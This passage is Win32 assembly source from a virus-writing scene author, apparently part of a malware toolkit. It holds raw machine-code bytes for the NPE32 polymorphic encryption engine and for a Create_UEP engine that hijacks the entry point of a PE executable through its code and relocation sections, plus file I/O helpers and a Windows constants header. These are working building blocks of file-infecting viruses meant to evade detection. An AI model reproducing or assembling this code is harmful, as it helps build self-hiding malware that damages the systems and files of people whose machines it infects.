;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  8..11  ³ number of commands in using commands  ³
;        ÃÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;        ³  11..16 ³ number of commands in using garbage   ³
;        ÀÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
; 	  Regs32 (bits 0..6):
;        ÚÄÄÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄÂÄÄÄ¿
;        ³ bit ³ 0 ³ 1 ³ 2 ³ 3 ³ 4 ³ 5 ³ 6 ³
;        ÃÄÄÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄÅÄÄÄ´
;        ³ reg ³EAX³EBX³EDX³ECX³ESI³EDI³EBP³
;        ÀÄÄÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÁÄÄÄÙ
;
;   Seed:
;  	 if this parametr is not NULL then randseed generator of NPE32
;        gets a new value for inicialize.If it is NULL NPE32 use getted
;        value for any random operations.
;
;And one 'little' thing : npe32 has a bug working in multi-layer mode,
;which destroyes original data.If size of encryptors+data more than
;D00h bytes it happends.
;
;necr0mancer2001@hotmail.com
npe_main:
db 060h,0E8h,000h,000h,000h,000h,05Dh,0EBh,077h,081h,0C0h,0A1h,001h,081h,0E8h
db 0A1h,000h,081h,0F0h,0A1h,002h,0F7h,0D0h,085h,003h,0D1h,0C0h,085h,005h,0D1h
db 0C8h,085h,004h,040h,000h,045h,007h,048h,000h,045h,006h,0F7h,0D8h,085h,008h
db 087h,0C0h,082h,000h,08Bh,0C0h,082h,000h,083h,0C0h,0C9h,000h,083h,0E8h,0C9h
db 000h,090h,090h,040h,000h,0EBh,000h,080h,000h,083h,0C8h,0CDh,000h,083h,0F0h
db 0CDh,000h,00Bh,0C0h,082h,000h,023h,0C0h,082h,000h,000h,003h,002h,001h,006h
db 007h,005h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,061h,0F9h,0C3h,08Bh,04Ch,024h,030h,0E3h,006h,089h
db 08Dh,0D0h,004h,000h,000h,08Bh,054h,024h,034h,052h,083h,0E2h,07Fh,08Dh,07Dh
db 070h,08Dh,075h,04Fh,033h,0C0h,040h,06Ah,007h,059h,033h,0DBh,052h,023h,0D0h
db 074h,002h,043h,0A4h,0D1h,0E0h,05Ah,0E2h,0F4h,00Bh,0DBh,074h,0CBh,083h,0FBh
db 003h,072h,0C6h,089h,09Dh,0BBh,003h,000h,000h,058h,08Bh,0D0h,066h,081h,0E2h
db 0FFh,000h,066h,025h,000h,0FFh,0C1h,0E8h,008h,08Bh,0C8h,025h,0F0h,000h,000h
db 000h,0C1h,0E8h,004h,083h,0F8h,009h,076h,003h,06Ah,009h,058h,00Bh,0C0h,074h
db 09Bh,089h,085h,0C2h,001h,000h,000h,083h,0E1h,00Fh,083h,0F9h,00Ah,076h,003h
db 06Ah,00Ah,059h,00Bh,0C9h,074h,086h,089h,08Dh,0D1h,003h,000h,000h,08Bh,04Ch
db 024h,02Ch,089h,08Dh,0F5h,002h,000h,000h,08Bh,07Ch,024h,028h,08Bh,074h,024h
db 024h,057h,053h,051h,081h,0C7h,000h,00Ch,000h,000h,057h,0B8h,090h,000h,000h
db 000h,003h,0C8h,0F3h,0AAh,05Fh,059h,08Bh,0DFh,00Fh,0BAh,0E2h,007h,073h,017h
db 051h,056h,08Dh,0B5h,007h,005h,000h,000h,0B9h,019h,000h,000h,000h,001h,08Dh
db 0F5h,002h,000h,000h,0F3h,0A4h,05Eh,059h,0F3h,0A4h,08Dh,08Dh,0CDh,004h,000h
db 000h,058h,08Bh,0F0h,0FFh,0D1h,08Ah,054h,005h,070h,08Bh,0C6h,0FFh,0D1h,08Ah
db 074h,005h,070h,03Ah,0F2h,074h,0F4h,088h,075h,057h,056h,04Eh,04Eh,08Bh,0C6h
db 0FFh,0D1h,040h,066h,089h,085h,0FEh,002h,000h,000h,091h,058h,08Dh,075h,070h
db 08Dh,07Dh,064h,0E8h,00Eh,003h,000h,000h,05Fh,057h,033h,0C0h,0E8h,0E1h,000h
db 000h,000h,050h,0DBh,01Ch,024h,058h,06Ah,005h,058h,0E8h,03Eh,003h,000h,000h
db 040h,091h,08Bh,044h,024h,004h,005h,000h,00Ch,000h,000h,089h,045h,05Ch,051h
db 057h,00Fh,0B7h,085h,0FEh,002h,000h,000h,08Bh,0C8h,048h,08Dh,075h,064h,08Dh
db 07Eh,006h,08Bh,0DFh,0E8h,0D1h,002h,000h,000h,05Fh,087h,0F3h,0ACh,08Ah,0F0h
db 056h,033h,0C0h,0B0h,0FFh,0BBh,000h,000h,000h,000h,08Dh,075h,003h,0E8h,013h
db 002h,000h,000h,08Dh,075h,05Ch,087h,026h,08Ah,0E6h,050h,08Bh,045h,060h,050h
db 087h,026h,05Eh,0E2h,0DAh,059h,0E2h,0BBh,033h,0C0h,0E8h,047h,001h,000h,000h
db 05Eh,060h,0FFh,0D6h,061h,05Fh,057h,08Bh,0DFh,081h,0C3h,000h,00Ch,000h,000h
db 056h,053h,0B0h,001h,0E8h,062h,000h,000h,000h,0E8h,0A7h,001h,000h,000h,08Dh
db 075h,05Ch,087h,026h,058h,089h,045h,060h,058h,08Bh,0DCh,087h,026h,08Bh,00Ch
db 024h,03Bh,0D9h,077h,00Eh,08Ah,0F4h,0B4h,000h,08Dh,075h,003h,0E8h,0BAh,001h
db 000h,000h,0EBh,0D8h,0B0h,001h,0E8h,000h,001h,000h,000h,08Bh,0DFh,05Eh,00Fh
db 0B7h,085h,0FEh,002h,000h,000h,0B9h,000h,000h,000h,000h,066h,0F7h,0E1h,091h
db 0F3h,0A5h,058h,02Bh,0F8h,089h,07Ch,024h,01Ch,0BFh,000h,000h,000h,000h,08Bh
db 045h,058h,050h,0DBh,01Ch,024h,059h,02Bh,0D9h,003h,0C3h,0ABh,0F8h,061h,0C2h
db 014h,000h,08Bh,0F7h,0FEh,0C8h,075h,008h,08Dh,08Dh,0ADh,003h,000h,000h,0EBh
db 006h,08Dh,08Dh,0E0h,003h,000h,000h,033h,0C0h,048h,0E8h,04Eh,002h,000h,000h
db 089h,045h,058h,0FFh,0D1h,057h,0DBh,004h,024h,058h,0B0h,0E8h,0AAh,033h,0C0h
db 0ABh,0FFh,0D1h,052h,08Bh,085h,0BBh,003h,000h,000h,0E8h,030h,002h,000h,000h
db 08Ah,074h,005h,070h,080h,0FEh,000h,074h,0ECh,0B0h,058h,00Ah,0C6h,0AAh,0FFh
db 0D1h,066h,0B8h,081h,0E8h,00Ah,0E6h,066h,0ABh,08Bh,045h,058h,083h,0C0h,005h
db 0ABh,0FFh,0D1h,051h,066h,0B8h,08Dh,080h,00Ah,0E6h,08Ah,075h,057h,08Ah,0D6h
db 0C0h,0E6h,003h,00Ah,0E6h,066h,0ABh,08Bh,045h,058h,02Bh,0DEh,003h,0C3h,089h
db 0BDh,04Dh,002h,000h,000h,0ABh,059h,0FFh,0D1h,066h,0B8h,087h,0E0h,00Ah,0E2h
db 066h,0ABh,05Ah,0FFh,0D1h,0B0h,0B8h,00Ah,0C2h,0AAh,052h,051h,0B8h,000h,000h
db 000h,000h,099h,033h,0C9h,066h,0B9h,000h,000h,0C1h,0E1h,002h,066h,0F7h,0F1h
db 040h,089h,085h,03Bh,002h,000h,000h,0ABh,059h,0FFh,0D1h,08Bh,0C7h,040h,089h
db 085h,07Bh,003h,000h,000h,087h,0CAh,00Fh,0B6h,08Dh,0FEh,002h,000h,000h,08Dh
db 075h,064h,0ACh,00Ch,058h,0AAh,0FFh,0D2h,0E2h,0F8h,05Ah,0C3h,053h,050h,0FEh
db 0C8h,075h,008h,08Dh,09Dh,0ADh,003h,000h,000h,0EBh,006h,08Dh,09Dh,0E0h,003h
db 000h,000h,0FFh,0D3h,00Fh,0B6h,08Dh,0FEh,002h,000h,000h,051h,08Dh,075h,064h
db 003h,0F1h,04Eh,0FDh,0ACh,0FCh,00Ch,050h,0AAh,0FFh,0D3h,0E2h,0F6h,066h,0B8h
db 081h,0C4h,066h,0ABh,058h,0C1h,0E0h,002h,0ABh,0FFh,0D3h,066h,0B8h,048h,074h
db 00Ah,0C2h,066h,0ABh,057h,0AAh,0FFh,0D3h,0B0h,0E9h,0AAh,0BEh,000h,000h,000h
db 000h,08Bh,0C7h,083h,0C0h,005h,02Bh,0C6h,0F7h,0D8h,0ABh,0FFh,0D3h,087h,0FEh
db 05Fh,08Bh,0C6h,02Bh,0C7h,048h,0AAh,087h,0FEh,0FFh,0D3h,066h,0B8h,087h,0E0h
db 00Ah,065h,057h,066h,0ABh,0FFh,0D3h,058h,0FEh,0C8h,074h,003h,0B0h,0C3h,0AAh
db 05Bh,0C3h,060h,0B8h,006h,000h,000h,000h,0E8h,015h,001h,000h,000h,040h,091h
db 0B8h,000h,000h,000h,000h,0E8h,009h,001h,000h,000h,08Ah,074h,005h,070h,0B8h
db 0FFh,000h,000h,000h,08Dh,075h,027h,0BBh,000h,000h,000h,000h,0E8h,007h,000h
db 000h,000h,0E2h,0DEh,089h,03Ch,024h,061h,0C3h,060h,03Ch,0FFh,074h,016h,0C6h
db 045h,056h,001h,08Dh,004h,086h,00Fh,0B6h,058h,003h,08Dh,004h,09Eh,08Ah,050h
db 002h,066h,08Bh,000h,0EBh,017h,0C6h,045h,056h,000h,093h,0E8h,0C7h,000h,000h
db 000h,089h,044h,024h,01Ch,08Dh,004h,086h,08Ah,050h,002h,066h,08Bh,000h,08Ah
db 0EAh,080h,0FEh,000h,075h,006h,00Fh,0BAh,0E2h,002h,073h,062h,080h,0E2h,003h
db 00Ah,0D2h,074h,013h,0FEh,0CAh,074h,007h,08Ah,0D6h,0C0h,0E2h,003h,00Ah,0E2h
db 00Ah,0E4h,075h,002h,00Ah,0C6h,00Ah,0E6h,08Ah,0D5h,080h,0E2h,0C0h,0C0h,0EAh
db 006h,0FEh,0CAh,075h,003h,0AAh,0EBh,002h,066h,0ABh,08Ah,0D5h,080h,0E2h,038h
db 0C0h,0EAh,003h,0FEh,04Dh,056h,074h,00Dh,033h,0C0h,048h,0E8h,06Dh,000h,000h
db 000h,089h,045h,060h,0EBh,003h,08Bh,045h,060h,080h,0FAh,004h,074h,00Bh,080h
db 0FAh,002h,074h,009h,0FEh,0CAh,074h,009h,0EBh,00Ah,0ABh,0EBh,007h,066h,0ABh
db 0EBh,003h,033h,0C0h,0AAh,089h,03Ch,024h,061h,0C3h,060h,049h,074h,02Bh,050h
db 058h,050h,0E8h,03Ah,000h,000h,000h,08Ah,004h,006h,03Ah,0C2h,074h,0F2h,03Ah
db 045h,057h,074h,0EDh,0AAh,086h,0E0h,05Bh,0ACh,03Ah,0C2h,074h,0FBh,03Ah,045h
db 057h,074h,0F6h,03Ah,0C4h,074h,0F2h,0AAh,0E2h,0EFh,061h,0C3h,093h,08Bh,0C3h
db 0E8h,00Fh,000h,000h,000h,08Ah,004h,006h,03Ah,0C2h,074h,0F2h,03Ah,045h,057h
db 074h,0EDh,0AAh,061h,0C3h,060h,050h,0B8h,078h,056h,034h,012h,0BFh,005h,084h
db 008h,008h,0F7h,0E7h,040h,089h,085h,0D0h,004h,000h,000h,033h,0D2h,059h,00Bh
db 0C9h,074h,006h,0F7h,0F1h,089h,054h,024h,01Ch,061h,0C3h,04Eh,050h,045h,033h
db 032h,05Bh,031h,033h,031h,038h,05Dh,06Eh,065h,063h,072h,030h,06Dh,061h,06Eh
db 063h,065h,072h,057h,00Fh,001h,04Ch,024h,0FEh,05Fh,089h,047h,008h,089h,047h
db 018h,00Fh,023h,0C0h,00Fh,023h,0C8h,00Fh,023h,0D0h,00Fh,023h,0D8h 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[NPE32BIN.INC]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RING3IO.INC]ÄÄÄ
;Include file ring-3 InputOutput functions
;(c) necr0mancer
;
;						necr0mancer2001@hotmail.com

;-------------------------------
;Input:edx=offset of filename

fopen  proc

       pushad

       xor ebx,ebx

       push ebx
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push ebx
       push FILE_SHARE_READ + FILE_SHARE_WRITE
       push GENERIC_READ + GENERIC_WRITE
       push edx
       call [ebp+CreateFile @ex]

       inc eax                 ;eax=-1?
       jz fopen_exit
       dec eax

fopen_exit:

       mov [esp._eax], eax
       popad
       retn
fopen  endp


;-------------------------------
;Input:ebx=handle

fclose proc

       pushad

       push ebx
       call [ebp+CloseHandle @ex]

       popad
       retn
fclose endp


;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to read
;      edx=offset of bufer
fread  proc

       pushad

       push 0

       lea eax,[ebp+offset bytesread @ex]
       push eax

       push ecx
       push edx
       push ebx
       call [ebp+ReadFile @ex]

       popad
       retn
fread  endp

;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to move
fseek  proc

       pushad

       push FILE_BEGIN
       push 0
       push ecx
       push ebx
       call [ebp+SetFilePointer @ex]

       popad
       retn
fseek  endp



;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to write
;      edi=offset of bufer

fwrite  proc

       pushad

       push 0

       lea eax,[ebp+offset bytesread @ex]
       push eax

       push ecx
       push edi

       push ebx
       call [ebp+WriteFile @ex]

       popad
       retn
fwrite  endp


f_createmap  proc
       pusha

       xor eax,eax
       push eax			    ;for mapvievoffile

       push eax			    ;name
       push eax                     ;lowsize
       push eax                     ;highsize
       push PAGE_READWRITE
       push eax
       push ebx
       call [ebp+CreateFileMappingA @ex]

       xchg ebx,eax

       pop eax			    ;null
       push eax			    ;count bytes
       push eax                     ;lowsize
       push eax                     ;highsize
       push FILE_MAP_WRITE
       push ebx
       call [ebp+MapViewOfFile @ex]

       mov [esp+_eax],eax
       popa
       retn
f_createmap  endp
    

f_closemap  proc
       pusha
       push ebx
       call [ebp+UnmapViewOfFile @ex]
       popa
       retn
f_closemap  endp
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RING3IO.INC]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RIPBIN.INC]ÄÄÄ
;It "engine" I have written for fun;)
;-----------------------------------------------------------------------------
;Create_UEP(
;	dword   VO			// virtual offset   		
;	*dword  code			// offset to .code section(already has read)  		
;	*dword  reloc   		// offset to .reloc section(already has read)  		
;	dword   num_records	        // count of records in table to rewrite
;       *dword  adr_modify		// address of "replasing" proc
;       *dword  mask_table              // pointer to a mask table
;        );
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Create_UEP:
db 060h,08Bh,074h,024h,02Ch,08Bh,07Ch,024h,028h,081h,0EFh,000h,010h,000h,000h
db 003h,03Eh,08Bh,046h,004h,0BAh,008h,000h,000h,000h,052h,02Bh,0C2h,099h,0B9h
db 002h,000h,000h,000h,066h,0F7h,0F1h,05Ah,091h,00Fh,0B7h,004h,016h,066h,025h
db 0FFh,00Fh,003h,0C7h,056h,051h,093h,08Bh,074h,024h,040h,033h,0C0h,0ACh,00Fh
db 0B6h,0C8h,066h,0ADh,00Bh,0C0h,074h,012h,049h,074h,008h,066h,039h,043h,0FEh
db 074h,026h,0EBh,005h,038h,043h,0FEh,074h,01Fh,0EBh,0E4h,059h,05Eh,083h,0C2h
db 002h,0E2h,0CAh,08Bh,046h,004h,003h,0F0h,099h,033h,0D2h,0BBh,000h,010h,000h
db 000h,0F7h,0F3h,00Bh,0D2h,074h,095h,0F9h,0EBh,02Dh,093h,059h,05Eh,051h,057h
db 0F8h,08Dh,05Ch,024h,038h,0FFh,00Bh,08Bh,00Bh,0E3h,01Bh,048h,048h,08Bh,0D8h
db 02Bh,0C7h,003h,006h,087h,0DFh,093h,056h,08Bh,074h,024h,030h,08Bh,044h,024h
db 040h,0FFh,0D0h,05Eh,05Fh,059h,0EBh,0BAh,05Fh,059h,061h,0C2h,018h,000h 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RIPBIN.INC]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WIN.INC]ÄÄÄ
;Windows95/NT assembly language include file by SMT/SMF. All rights reserved.
;Modifed by Necr0mancer.No rights reserved.

NULL equ 0
TRUE equ 1
FALSE equ 0

MAX_PATH                equ 260
PIPE_WAIT               equ 00000000h
PIPE_NOWAIT             equ 00000001h
PIPE_READMODE_BYTE      equ 00000000h
PIPE_READMODE_MESSAGE   equ 00000002h
PIPE_TYPE_BYTE          equ 00000000h
PIPE_TYPE_MESSAGE       equ 00000004h
SC_SIZE         equ 0F000h
SC_MOVE         equ 0F010h
SC_MINIMIZE     equ 0F020h
SC_MAXIMIZE     equ 0F030h
SC_NEXTWINDOW   equ 0F040h
SC_PREVWINDOW   equ 0F050h
SC_CLOSE        equ 0F060h
SC_VSCROLL      equ 0F070h
SC_HSCROLL      equ 0F080h
SC_MOUSEMENU    equ 0F090h
SC_KEYMENU      equ 0F100h
SC_ARRANGE      equ 0F110h
SC_RESTORE      equ 0F120h
SC_TASKLIST     equ 0F130h
SC_SCREENSAVE   equ 0F140h
SC_HOTKEY       equ 0F150h
SC_DEFAULT      equ 0F160h
SC_MONITORPOWER equ 0F170h
SC_CONTEXTHELP  equ 0F180h
SC_SEPARATOR    equ 0F00Fh
                
WM_NULL                         equ 0000h
WM_CREATE                       equ 0001h
WM_DESTROY                      equ 0002h
WM_MOVE                         equ 0003h
WM_SIZE                         equ 0005h
WM_ACTIVATE                     equ 0006h
WA_INACTIVE                     equ 0
WA_ACTIVE                       equ 1
WA_CLICKACTIVE                  equ 2
WM_SETFOCUS                     equ 0007h
WM_KILLFOCUS                    equ 0008h
WM_ENABLE                       equ 000Ah
WM_SETREDRAW                    equ 000Bh
WM_SETTEXT                      equ 000Ch
WM_GETTEXT                      equ 000Dh
WM_GETTEXTLENGTH                equ 000Eh
WM_PAINT                        equ 000Fh
WM_CLOSE                        equ 0010h
WM_QUERYENDSESSION              equ 0011h
WM_QUIT                         equ 0012h
WM_QUERYOPEN                    equ 0013h
WM_ERASEBKGND                   equ 0014h
WM_SYSCOLORCHANGE               equ 0015h
WM_ENDSESSION                   equ 0016h
WM_SHOWWINDOW                   equ 0018h
WM_WININICHANGE                 equ 001Ah
WM_DEVMODECHANGE                equ 001Bh
WM_ACTIVATEAPP                  equ 001Ch
WM_FONTCHANGE                   equ 001Dh
WM_TIMECHANGE                   equ 001Eh
WM_CANCELMODE                   equ 001Fh
WM_SETCURSOR                    equ 0020h
WM_MOUSEACTIVATE                equ 0021h
WM_CHILDACTIVATE                equ 0022h
WM_QUEUESYNC                    equ 0023h
WM_GETMINMAXINFO                equ 0024h
WM_PAINTICON                    equ 0026h
WM_ICONERASEBKGND               equ 0027h
WM_NEXTDLGCTL                   equ 0028h
WM_SPOOLERSTATUS                equ 002Ah
WM_DRAWITEM                     equ 002Bh
WM_MEASUREITEM                  equ 002Ch
WM_DELETEITEM                   equ 002Dh
WM_VKEYTOITEM                   equ 002Eh
WM_CHARTOITEM                   equ 002Fh
WM_SETFONT                      equ 0030h
WM_GETFONT                      equ 0031h
WM_SETHOTKEY                    equ 0032h
WM_GETHOTKEY                    equ 0033h
WM_QUERYDRAGICON                equ 0037h
WM_COMPAREITEM                  equ 0039h
WM_COMPACTING                   equ 0041h
WM_COMMNOTIFY                   equ 0044h ; /* no longer suported */
WM_WINDOWPOSCHANGING            equ 0046h
WM_WINDOWPOSCHANGED             equ 0047h
WM_POWER                        equ 0048h
WM_COPYDATA                     equ 004Ah
WM_CANCELJOURNAL                equ 004Bh
WM_NOTIFY                       equ 004Eh
WM_INPUTLANGCHANGERequEST       equ 0050h
WM_INPUTLANGCHANGE              equ 0051h
WM_TCARD                        equ 0052h
WM_HELP                         equ 0053h
WM_USERCHANGED                  equ 0054h
WM_NOTIFYFORMAT                 equ 0055h
NFR_ANSI                        equ    1h
NFR_UNICODE                     equ    2h
NF_QUERY                        equ    3h
NF_RequERY                      equ    4h
WM_CONTEXTMENU                  equ 007Bh
WM_STYLECHANGING                equ 007Ch
WM_STYLECHANGED                 equ 007Dh
WM_DISPLAYCHANGE                equ 007Eh
WM_GETICON                      equ 007Fh
WM_SETICON                      equ 0080h
WM_NCCREATE                     equ 0081h
WM_NCDESTROY                    equ 0082h
WM_NCCALCSIZE                   equ 0083h
WM_NCHITTEST                    equ 0084h
WM_NCPAINT                      equ 0085h
WM_NCACTIVATE                   equ 0086h
WM_GETDLGCODE                   equ 0087h
WM_NCMOUSEMOVE                  equ 00A0h
WM_NCLBUTTONDOWN                equ 00A1h
WM_NCLBUTTONUP                  equ 00A2h
WM_NCLBUTTONDBLCLK              equ 00A3h
WM_NCRBUTTONDOWN                equ 00A4h
WM_NCRBUTTONUP                  equ 00A5h
WM_NCRBUTTONDBLCLK              equ 00A6h
WM_NCMBUTTONDOWN                equ 00A7h
WM_NCMBUTTONUP                  equ 00A8h
WM_NCMBUTTONDBLCLK              equ 00A9h
WM_KEYFIRST                     equ 0100h
WM_KEYDOWN                      equ 0100h
WM_KEYUP                        equ 0101h
WM_CHAR                         equ 0102h
WM_DEADCHAR                     equ 0103h
WM_SYSKEYDOWN                   equ 0104h
WM_SYSKEYUP                     equ 0105h
WM_SYSCHAR                      equ 0106h
WM_SYSDEADCHAR                  equ 0107h
WM_KEYLAST                      equ 0108h
WM_IME_STARTCOMPOSITION         equ 010Dh
WM_IME_ENDCOMPOSITION           equ 010Eh
WM_IME_COMPOSITION              equ 010Fh
WM_IME_KEYLAST                  equ 010Fh
WM_INITDIALOG                   equ 0110h
WM_COMMAND                      equ 0111h
WM_SYSCOMMAND                   equ 0112h
WM_TIMER                        equ 0113h
WM_HSCROLL                      equ 0114h
WM_VSCROLL                      equ 0115h
WM_INITMENU                     equ 0116h
WM_INITMENUPOPUP                equ 0117h
WM_MENUSELECT                   equ 011Fh
WM_MENUCHAR                     equ 0120h
WM_ENTERIDLE                    equ 0121h
WM_CTLCOLORMSGBOX               equ 0132h
WM_CTLCOLOREDIT                 equ 0133h
WM_CTLCOLORLISTBOX              equ 0134h
WM_CTLCOLORBTN                  equ 0135h
WM_CTLCOLORDLG                  equ 0136h
WM_CTLCOLORSCROLLBAR            equ 0137h
WM_CTLCOLORSTATIC               equ 0138h
WM_MOUSEFIRST                   equ 0200h
WM_MOUSEMOVE                    equ 0200h
WM_LBUTTONDOWN                  equ 0201h
WM_LBUTTONUP                    equ 0202h
WM_LBUTTONDBLCLK                equ 0203h
WM_RBUTTONDOWN                  equ 0204h
WM_RBUTTONUP                    equ 0205h
WM_RBUTTONDBLCLK                equ 0206h
WM_MBUTTONDOWN                  equ 0207h
WM_MBUTTONUP                    equ 0208h
WM_MBUTTONDBLCLK                equ 0209h
WM_MOUSEWHEEL                   equ 020Ah
WM_PARENTNOTIFY                 equ 0210h
MENULOOP_WINDOW                 equ    0h
MENULOOP_POPUP                  equ    1h
WM_ENTERMENULOOP                equ 0211h
WM_EXITMENULOOP                 equ 0212h
WM_SIZING                       equ 0214h
WM_CAPTURECHANGED               equ 0215h
WM_MOVING                       equ 0216h
WM_POWERBROADCAST               equ 0218h
WM_DEVICECHANGE                 equ 0219h
WM_IME_SETCONTEXT               equ 0281h
WM_IME_NOTIFY                   equ 0282h
WM_IME_CONTROL                  equ 0283h
WM_IME_COMPOSITIONFULL          equ 0284h
WM_IME_SELECT                   equ 0285h
WM_IME_CHAR                     equ 0286h
WM_IME_KEYDOWN                  equ 0290h
WM_IME_KEYUP                    equ 0291h
WM_MDICREATE                    equ 0220h
WM_MDIDESTROY                   equ 0221h
WM_MDIACTIVATE                  equ 0222h
WM_MDIRESTORE                   equ 0223h
WM_MDINEXT                      equ 0224h
WM_MDIMAXIMIZE                  equ 0225h
WM_MDITILE                      equ 0226h
WM_MDICASCADE                   equ 0227h
WM_MDIICONARRANGE               equ 0228h
WM_MDIGETACTIVE                 equ 0229h
WM_MDISETMENU                   equ 0230h
WM_ENTERSIZEMOVE                equ 0231h
WM_EXITSIZEMOVE                 equ 0232h
WM_DROPFILES                    equ 0233h
WM_MDIREFRESHMENU               equ 0234h
WM_MOUSEHOVER                   equ 02A1h
WM_MOUSELEAVE                   equ 02A3h
WM_CUT                          equ 0300h
WM_COPY                         equ 0301h
WM_PASTE                        equ 0302h
WM_CLEAR                        equ 0303h
WM_UNDO                         equ 0304h
WM_RENDERFORMAT                 equ 0305h
WM_RENDERALLFORMATS             equ 0306h
WM_DESTROYCLIPBOARD             equ 0307h
WM_DRAWCLIPBOARD                equ 0308h
WM_PAINTCLIPBOARD               equ 0309h
WM_VSCROLLCLIPBOARD             equ 030Ah
WM_SIZECLIPBOARD                equ 030Bh
WM_ASKCBFORMATNAME              equ 030Ch
WM_CHANGECBCHAIN                equ 030Dh
WM_HSCROLLCLIPBOARD             equ 030Eh
WM_QUERYNEWPALETTE              equ 030Fh
WM_PALETTEISCHANGING            equ 0310h
WM_PALETTECHANGED               equ 0311h
WM_HOTKEY                       equ 0312h
WM_PRINT                        equ 0317h
WM_PRINTCLIENT                  equ 0318h
WM_HANDHELDFIRST                equ 0358h
WM_HANDHELDLAST                 equ 035Fh
WM_AFXFIRST                     equ 0360h
WM_AFXLAST                      equ 037Fh
WM_PENWINFIRST                  equ 0380h
WM_PENWINLAST                   equ 038Fh
                                    
                                    
                                    
MB_OK                   equ             000000000h
MB_OKCANCEL             equ             000000001h
MB_ABORTRETRYIGNORE     equ             000000002h
MB_YESNOCANCEL          equ             000000003h
MB_YESNO                equ             000000004h
MB_RETRYCANCEL          equ             000000005h
MB_TYPEMASK             equ             00000000fh
MB_ICONHAND             equ             000000010h
MB_ICONQUESTION         equ             000000020h
MB_ICONEXCLAMATION      equ             000000030h
MB_ICONASTERISK         equ             000000040h
MB_ICONMASK             equ             0000000f0h
MB_ICONINFORMATION      equ             000000040h
MB_ICONSTOP             equ             000000010h
MB_DEFBUTTON1           equ             000000000h
MB_DEFBUTTON2           equ             000000100h
MB_DEFBUTTON3           equ             000000200h
MB_DEFMASK              equ             000000f00h
MB_APPLMODAL            equ             000000000h
MB_SYSTEMMODAL          equ             000001000h
MB_TASKMODAL            equ             000002000h
MB_NOFOCUS              equ             000008000h
IDNO                    equ             7
IDYES                   equ             6
IDCANCEL                equ             2
SB_HORZ                 equ     0
SB_VERT                 equ     1
SB_CTL                  equ     2
SB_BOTH                 equ     3
SB_THUMBPOSITION        equ     4
SB_ENDSCROLL            equ     8

SW_HIDE                 equ     00h
SW_SHOWNORMAL           equ     01h
SW_SHOWMINIMIZED        equ     02h
SW_SHOWMAXIMIZED        equ     03h
SW_SHOW                 equ     05h
SW_RESTORE              equ     09h
SW_SHOWDEFAULT          equ     0Ah
WM_USER                 equ     0400h

WS_POPUP                equ     080000000h
WS_CHILD                equ     040000000h
WS_MINIMIZE             equ     020000000h
WS_VISIBLE              equ     010000000h
WS_MAXIMIZE             equ     001000000h
WS_CAPTION              equ     000C00000h
WS_BORDER               equ     000800000h
WS_DLGFRAME             equ     000400000h
WS_VSCROLL              equ     000200000h
WS_HSCROLL              equ     000100000h
WS_SYSMENU              equ     000080000h
;WS_SIZEBOX             equ     000040000h
WS_MINIMIZEBOX          equ     000020000h
WS_MAXIMIZEBOX          equ     000010000h
WS_OVERLAPPEDWINDOW     equ     000CF0000h
WS_EX_NOPARENTNOTIFY    equ     000000004h
WS_EX_WINDOWEDGE        equ     000000100h
WS_EX_CLIENTEDGE        equ     000000200h
WS_EX_OVERLAPPEDWINDOW  equ     WS_EX_WINDOWEDGE + WS_EX_CLIENTEDGE

CS_VREDRAW              equ     00001h
CS_HREDRAW              equ     00002h
CS_PARENTDC             equ     00080h
CS_BYTEALIGNWINDOW      equ     02000h

BDR_RAISEDOUTER         equ     01h
BDR_SUNKENOUTER         equ     02h
BDR_RAISEDINNER         equ     04h
BDR_SUNKENINNER         equ     08h
EDGE_RAISED             equ     BDR_RAISEDOUTER + BDR_RAISEDINNER
